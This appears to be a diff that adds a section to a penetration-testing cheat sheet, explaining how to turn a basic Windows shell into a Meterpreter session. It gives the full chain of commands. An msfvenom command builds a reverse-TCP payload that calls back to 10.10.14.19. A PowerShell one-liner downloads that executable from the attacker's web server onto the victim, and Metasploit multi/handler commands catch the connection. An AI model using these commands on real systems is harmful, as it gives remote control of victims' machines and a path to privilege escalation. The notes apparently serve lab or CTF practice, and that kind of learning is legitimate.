@@ -163,3 +163,27 @@ Then set options and run.
 
 ### Use `systeminfo` on the Windows shell
 In the results, check the Hotfixes part to see if the system has been updated, and what updates it has.
+
+### Upgrade regular shell to meterpreter shell (Windows)
+Once there is a regular shell available, it may be useful to upgrade it to a meterpreter shell to use metasploit modules to, for example, escalate privileges.
+
+Generate executable using `msfvenom`:
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.19 LPORT=6666 -f exe -o hola.exe
+```
+
+After making hola.exe available through a web server on the attacker machine (use Python http simple web server for that), download it using Powershell on the target machine:
+```
+powershell "(New-Object System.Net.Webclient).Downloadfile('http://10.10.14.19:8000/hola.exe', 'meterpreter.exe')"
+```
+
+Use the multi handler module to listen to connections on the attacker machine:
+```
+use multi/handler
+set LPORT 6666
+set LHOST tun0
+run
+```
+
+Execute `meterpreter.exe` on the victim machine and that's it.
+```
